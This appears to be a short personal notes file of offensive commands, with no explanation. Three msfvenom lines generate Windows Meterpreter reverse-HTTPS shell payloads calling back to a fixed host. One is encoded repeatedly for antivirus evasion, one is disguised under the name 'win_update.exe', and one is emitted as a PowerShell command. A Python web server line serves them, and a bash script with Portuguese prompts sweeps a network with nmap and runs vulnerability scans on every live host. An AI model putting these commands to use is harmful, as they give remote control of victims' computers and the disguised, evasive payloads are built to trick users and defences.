msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

#!/bin/bash

echo "Digite o IP ou faixa de rede (exemplo: 192.168.1.0/24): "
read REDE

echo "Procurando hosts ativos..."
nmap -sn $REDE -oN hosts_ativos.txt
cat hosts_ativos.txt | grep "Nmap scan report for" | awk '{print $5}' > ips_encontrados.txt

for ip in $(cat ips_encontrados.txt)
do
    echo "Escaneando IP: $ip"
    nmap -A -Pn -p- $ip -oN scan_$ip.txt
    echo "Verificando vulnerabilidades no IP: $ip"
    nmap --script vuln -Pn -p- $ip -oN vuln_$ip.txt
done

echo "Scan completo. Resultados salvos nos arquivos scan_<ip>.txt e vuln_<ip>.txt"

